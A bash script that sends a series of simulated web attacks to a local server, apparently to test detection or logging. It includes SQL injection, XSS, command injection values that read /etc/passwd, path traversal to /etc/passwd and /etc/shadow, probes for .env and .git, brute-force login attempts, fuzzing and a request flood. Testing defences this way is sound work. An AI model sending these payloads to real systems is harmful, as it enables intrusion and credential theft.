#!/bin/bash

BASE_URL="http://localhost:8080"

echo "🔥 1. SQL Injection Attacks"
curl -s "$BASE_URL/login?user=admin' OR 1=1--" > /dev/null
curl -s "$BASE_URL/login?user=admin' UNION SELECT null,null--" > /dev/null
curl -s "$BASE_URL/login?user=admin' AND 1=1--" > /dev/null
sleep 1

echo "💀 2. XSS (Cross-Site Scripting)"
curl -s "$BASE_URL/search?q=<script>alert(1)</script>" > /dev/null
curl -s "$BASE_URL/search?q=<img src=x onerror=alert(1)>" > /dev/null
sleep 1

echo "⚙️ 3. Command Injection"
curl -s "$BASE_URL/run?cmd=ls;cat /etc/passwd" > /dev/null
curl -s "$BASE_URL/run?cmd=whoami && id" > /dev/null
curl -s "$BASE_URL/run?cmd=\$(whoami)" > /dev/null
sleep 1

echo "📂 4. Path Traversal"
curl -s "$BASE_URL/../../etc/passwd" > /dev/null
curl -s "$BASE_URL/../../../etc/shadow" > /dev/null
curl -s "$BASE_URL/..%2f..%2fetc/passwd" > /dev/null
sleep 1

echo "🧭 5. Directory Enumeration"
curl -s "$BASE_URL/.env" > /dev/null
curl -s "$BASE_URL/.git" > /dev/null
curl -s "$BASE_URL/admin" > /dev/null
curl -s "$BASE_URL/config" > /dev/null
sleep 1

echo "🔐 6. Brute Force Simulation"
for i in {1..10}; do
  curl -s "$BASE_URL/login?user=admin&pass=wrong$i" > /dev/null
done
sleep 1

echo "🧪 7. Payload Fuzzing"
for payload in "' OR 1=1--" "<script>" "&& ls" "../../etc/passwd"; do
  curl -G --data-urlencode "input=$payload" "$BASE_URL/test" > /dev/null
done
sleep 1

echo "🌐 8. Scanner Simulation"
for path in /admin /.git /.env /login /config /test /backup; do
  curl -s "$BASE_URL$path" > /dev/null
done
sleep 1

echo "⚡ 9. High Traffic Attack (Stress Test)"
for i in {1..50}; do
  curl -s "$BASE_URL/login" > /dev/null &
done
wait
sleep 1

echo "🧠 10. Advanced Attacker Simulation"
curl -s "$BASE_URL/login?user=admin' OR 1=1--" > /dev/null
curl -s "$BASE_URL/.env" > /dev/null
curl -s "$BASE_URL/run?cmd=cat /etc/passwd" > /dev/null
curl -s "$BASE_URL/search?q=<script>alert(1)</script>" > /dev/null

echo "✅ All simulated attacks completed!"
